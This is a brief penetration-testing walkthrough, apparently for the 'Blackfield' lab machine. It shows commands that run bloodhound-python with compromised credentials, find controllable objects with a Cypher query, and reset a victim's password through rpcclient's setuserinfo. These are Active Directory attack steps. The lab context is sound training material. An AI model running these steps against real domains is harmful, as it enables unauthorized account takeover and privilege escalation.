If `bloodhound` is not already installed, it can be using:

```
sudo apt-get install bloodhound
pip3 install bloodhound
```

**NOTE:** `bloodhound` and `bloodhound-python` are different packages. Install them both.

Using extracted credentials, execute the `bloodhound-python` data collector using the following command

`bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.192 -c DcOnly`

This will create multiple files:

```
20221124194526_computers.json
20221124194526_domains.json
20221124194526_groups.json
20221124194526_users.json
```

If this is the first launch of `bloodhound`, there are some prerequisites. Run the following commands, and then login to the database Web UI at `https://localhost:7474` using the credentials `neo4j / neo4j`

```
mkdir -p /usr/share/neo4j/logs
touch /usr/share/neo4j/logs/neo4j.log
sudo neo4j start
bloodhound
```

If this is not the first launch, just run `sudo neo4j start` and then `bloodhound`.

Drag and drop the files created by `bloodhound-python` into bloodhound to import the data. Begin analysis by searching for `support` (the account we have compromised, in this case) and right click it to mark as owned.

Click 'Raw Query' at the bottom of bloodhound and run the following query to search for objects in the 1st degree (i.e. 1 hop away) that our owned user can control.

`MATCH p=(u {owned: true})-[r1]->(n) WHERE r1.isacl=true RETURN p`

This command, as an example, might show that the owned user has the `ForceChangePassword` permission on the victim user. This privilege can then be abused using `rpcclient`

`rpcclient -U domainName/owned 10.10.10.192`
`setuserinfo victim 23 newPassword!`